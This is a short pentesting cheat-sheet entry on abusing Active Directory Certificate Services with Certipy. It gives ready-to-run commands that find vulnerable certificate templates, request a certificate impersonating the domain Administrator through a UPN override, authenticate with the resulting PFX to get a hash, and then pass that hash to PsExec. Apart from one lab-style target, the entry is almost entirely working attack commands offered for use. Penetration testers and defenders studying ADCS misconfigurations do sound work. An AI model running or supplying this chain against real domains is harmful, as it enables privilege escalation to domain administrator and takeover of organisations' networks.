---
title: Certipy / ADCS Abuse
category: ad
subcategory: ad-attacks
os: linux
command: certipy-ad find -u user -p pass -dc-ip target -vulnerable
tools: certipy, certipy-ad
---


### Find vulnerable templates

```bash
certipy-ad find -u SUSANNA_MCKNIGHT@local.thm -p 'REDACTED' -dc-ip 10.10.161.74 -vulnerable
certipy-ad find -u test@test.local -p 'test' -dc-ip $target -vulnerable -stdout
certipy-ad find -u test@test.local -p 'test' -dc-ip $target -text -output certs
```

### Filter for delegated enrollment rights

```bash
cat -n certs_Certipy.txt | grep -iC4 'enrollment rights' | grep -viE "Enterprise Admins|Domain Admins|Domain Controllers" | fgrep -i '\'
```

### Forge a certificate

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'UserTemplate' \
    -upn 'Administrator@corp.local'
```

With explicit SID:

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'UserTemplate' \
    -upn 'Administrator@corp.local' -sid 'S-1-5-21-...-500'
```

### Authenticate with the PFX

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target
```

Then use the returned hash with PsExec.

### Reference

https://github.com/ly4k/Certipy/wiki
